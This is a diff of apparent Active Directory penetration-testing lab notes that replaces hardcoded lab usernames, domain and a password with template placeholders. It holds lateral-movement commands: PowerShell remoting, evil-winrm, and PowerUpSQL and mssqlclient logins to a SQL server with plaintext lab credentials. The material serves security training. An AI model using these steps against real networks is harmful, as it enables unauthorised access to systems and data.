@@ -27,8 +27,8 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:C
 ## 4. `powershell` _(output omitted)_
 
 ```powershell
-$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
-$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+$password = ConvertTo-SecureString "{{PASSWORD}}" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("{{DOMAIN_NB}}\{{USERNAME}}", $password)
 Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
 
 ```
@@ -48,7 +48,7 @@ evil-winrm
 ## 7. `shellsession` _(output omitted)_
 
 ```bash
-evil-winrm -i 10.129.201.234 -u forend
+evil-winrm -i 10.129.201.234 -u {{USERNAME}}
 ```
 
 ## 8. `cypher`
@@ -68,7 +68,7 @@ PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 ## 10. `powershell` _(output omitted)_
 
 ```powershell
- Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+ Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "{{DOMAIN_NB}}\damundsen" -password "SQL1234!" -query 'Select @@version'
 ```
 
 ## 11. `shellsession` _(output omitted)_
@@ -80,6 +80,6 @@ mssqlclient.py
 ## 12. `shellsession` _(output omitted)_
 
 ```bash
-mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+mssqlclient.py {{DOMAIN_NB}}/DAMUNDSEN@172.16.5.150 -windows-auth
 ```
 
